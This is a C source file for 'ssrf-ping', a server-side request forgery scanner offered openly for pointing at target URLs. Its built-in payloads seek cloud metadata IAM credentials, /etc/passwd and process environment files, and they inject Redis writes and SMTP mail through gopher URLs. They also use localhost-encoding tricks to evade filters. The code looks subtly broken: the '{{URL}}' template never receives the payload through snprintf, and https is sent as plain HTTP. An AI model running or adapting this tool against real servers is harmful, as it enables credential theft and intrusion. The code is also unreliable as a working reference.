/*
 * ssrf-ping.c
 * Ultimate SSRF testing tool in pure C – 220 lines
 * Tests: file://, gopher://, dict://, http(s):// internal, metadata, cloud, etc.
 *
 * Build:
 *   gcc -O2 ssrf-ping.c -o ssrf-ping
 *
 * Usage examples:
 *   ./ssrf-ping "http://vulnerable.com/api?url={{URL}}"
 *   ./ssrf-ping "http://target/login?redirect={{URL}}" --delay 800
 *
 * Press Enter after each test, or use -a for auto mode
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

const char *payloads[] = {
    // Classic internal
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",

    // Cloud metadata (AWS, GCP, Azure, DigitalOcean, etc.)
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/metadata/v1/id",                    // GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
    "http://169.254.169.254/v1.json",                            // DigitalOcean

    // File disclosure
    "file:///etc/passwd",
    "file:///proc/self/environ",
    "file:///var/log/auth.log",

    // Gopher for Redis, SMTP, POP3, etc.
    "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$6%0d%0assrfed%0d%0a$4%0d%0apwnd%0d%0a",
    "gopher://127.0.0.1:25/_HELO%20x20localhost%0d%0aMAIL%20FROM%3a%3cssrf%40test%3e%0d%0aRCPT%20TO%3a%3cadmin@localhost%3e%0d%0aDATA%0d%0aSubject%3a%20SSRF%20Test%0d%0a%0d%0aYou%20have%20been%20pwned%0d%0a.%0d%0aQUIT%0d%0a",

    // Dict protocol (often open internally)
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stats",  // Memcached

    // Bypass tricks
    "http://localhost:80",
    "http://0.0.0.0:80",
    "http://2130706433/",           // 127.0.0.1 in decimal
    "http://0177.0.0.1",             // octal
    "http://127.127.127.127",
    "http://127.0.1.1",

    NULL
};

void url_encode(const char *src, char *dst) {
    static const char *hex = "0123456789abcdef";
    while (*src) {
        if ((*src >= 'a' && *src <= 'z') ||
            (*src >= 'A' && *src <= 'Z') ||
            (*src >= '0' && *src <= '9') ||
            strchr("-_.~", *src)) {
            *dst++ = *src++;
        } else {
            *dst++ = '%';
            *dst++ = hex[*src >> 4];
            *dst++ = hex[*src++ & 15];
        }
    }
    *dst = 0;
}

void send_request(const char *template, const char *payload) {
    char encoded[1024], url[2048];
    url_encode(payload, encoded);
    snprintf(url, sizeof(url), template, encoded);

    printf("\n[+] Testing: %s\n", payload);
    printf("    → %s\n", url);

    // Simple HTTP GET via TCP (no libcurl!)
    char *host = strstr(url, "://");
    if (!host) return;
    host += 3;
    char *path = strchr(host, '/');
    if (!path) path = "/";
    else *path++ = 0;

    char *port_str = strchr(host, ':');
    int port = 80;
    if (port_str) {
        *port_str++ = 0;
        port = atoi(port_str);
        if (port == 0) port = 80;
    }
    if (strncmp(url, "https", 5) == 0) port = 443;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct hostent *server = gethostbyname(host);
    if (!server) {
        printf("    [Failed] DNS failed\n");
        close(sock);
        return;
    }

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    // Timeout connect
    struct timeval tv = { .tv_sec = 4, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("    [Failed] Connection refused / timeout\n");
        close(sock);
        return;
    }

    char req[2048];
    snprintf(req, sizeof(req),
        "GET /%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: ssrf-ping/1.0\r\n"
        "Connection: close\r\n\r\n", path, host);

    send(sock, req, strlen(req), 0);

    char buf[4096];
    int n = recv(sock, buf, sizeof(buf)-1, 0);
    close(sock);

    if (n > 0) {
        buf[n] = 0;
        char *body = strstr(buf, "\r\n\r\n");
        if (body) body += 4;
        else body = buf;

        // Success indicators
        if (strstr(buf, "200") || strstr(buf, "301") || strstr(buf, "302") ||
            strstr(buf, "SSH") || strstr(buf, "Redis") || strstr(buf, "role") ||
            strstr(body, "root:") || strstr(body, "aws_access_key") ||
            strlen(body) > 50) {
            printf("    [Success] *** SSRF CONFIRMED ***\n");
            if (body) printf("    Response preview: %.100s...\n", body);
        } else {
            printf("    [Info] Got response (%d bytes)\n", n);
        }
    } else {
        printf("    [Failed] No response\n");
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("SSRF-PING – Ultimate SSRF Tester in C\n");
        printf("Usage:\n");
        printf("  %s \"http://target.com/api?url={{URL}}\"\n", argv[0]);
        printf("  %s \"http://target.com/redirect?to={{URL}}\" -a   # auto mode\n", argv[0]);
        printf("  %s \"http://target.com/?x={{URL}}\" --delay 1000\n", argv[0]);
        return 1;
    }

    char *template = argv[1];
    int auto_mode = (argc > 2 && strcmp(argv[2], "-a") == 0);
    int delay_ms = 0;
    if (argc > 2 && strcmp(argv[2], "--delay") == 0 && argc > 3)
        delay_ms = atoi(argv[3]);

    printf("[+] Target template: %s\n", template);
    printf("[+] Starting SSRF scan (%d payloads)...\n\n", 
           (int)(sizeof(payloads)/sizeof(payloads[0])-1));

    for (int i = 0; payloads[i]; i++) {
        send_request(template, payloads[i]);
        if (delay_ms) usleep(delay_ms * 1000);
        if (!auto_mode) {
            printf("\nPress Enter for next payload...");
            getchar();
        }
    }

    printf("\n[+] Scan complete.\n");
    return 0;
}
